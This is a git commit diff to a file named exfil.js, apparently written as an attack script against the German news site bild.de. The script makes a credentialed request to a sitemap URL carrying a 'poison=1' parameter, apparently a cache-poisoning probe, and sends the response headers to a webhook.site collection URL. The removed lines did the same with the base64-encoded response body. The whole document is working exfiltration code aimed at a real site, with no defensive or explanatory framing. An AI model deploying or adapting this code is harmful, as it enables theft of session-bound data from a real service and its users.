78f4b9e359ba8ef2a764d9a38edafdd4ef8610fd
MD_ISHFAQ <69152643+MOHAMMED-ISHFAQ@users.noreply.github.com>
2025-08-07 23:17:55 +0530

    exfil.js

--- exfil.js
+++ exfil.js
@@ -1,9 +1,13 @@
+<script>
 fetch("https://www.bild.de/sitemap-index-200605.xml?poison=1", {
   method: "GET",
   credentials: "include"
 })
-  .then(res => res.text())
-  .then(data => {
-    // Replace with your server if needed
-    fetch("https://webhook.site/8682f4eb-9534-4d00-8a0d-1abb010810da?data=" + encodeURIComponent(btoa(data)));
-  });
+.then(res => {
+  const headers = {};
+  for (let pair of res.headers.entries()) {
+    headers[pair[0]] = pair[1];
+  }
+  return fetch("https://webhook.site/8682f4eb-9534-4d00-8a0d-1abb010810da?headers=" + encodeURIComponent(JSON.stringify(headers)));
+});
+</script>
